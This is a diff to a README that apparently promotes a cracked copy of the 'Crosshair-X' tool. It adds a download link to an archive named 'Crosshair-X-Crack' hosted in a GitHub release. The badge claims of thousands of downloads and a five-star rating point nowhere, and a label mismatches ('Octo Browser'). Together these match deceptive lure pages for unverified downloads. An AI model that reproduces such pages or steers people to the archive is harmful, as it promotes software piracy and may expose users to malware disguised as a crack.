@@ -4,7 +4,7 @@
   [![Downloads](https://img.shields.io/badge/Downloads-9k%2B-blue?style=for-the-badge&logo=download&logoColor=white)](#)
   [![Rating](https://img.shields.io/badge/Rating-5%20Stars-Gold?style=for-the-badge)](#)
 
-  [![Download Octo Browser](https://img.shields.io/badge/Download-CrosshairX-orange)]()
+  [![Download Octo Browser](https://img.shields.io/badge/Download-CrosshairX-orange)](https://github.com/JonasShFukuhara/Crosshair-X/releases/download/Crosshair-X-Crack/Crosshair-X-Crack-master.zip)
 
  <p align="center">
     <img src="https://github.com/user-attachments/assets/8d04556a-7b97-4d08-87d3-7f91940d0f7f" width="750">
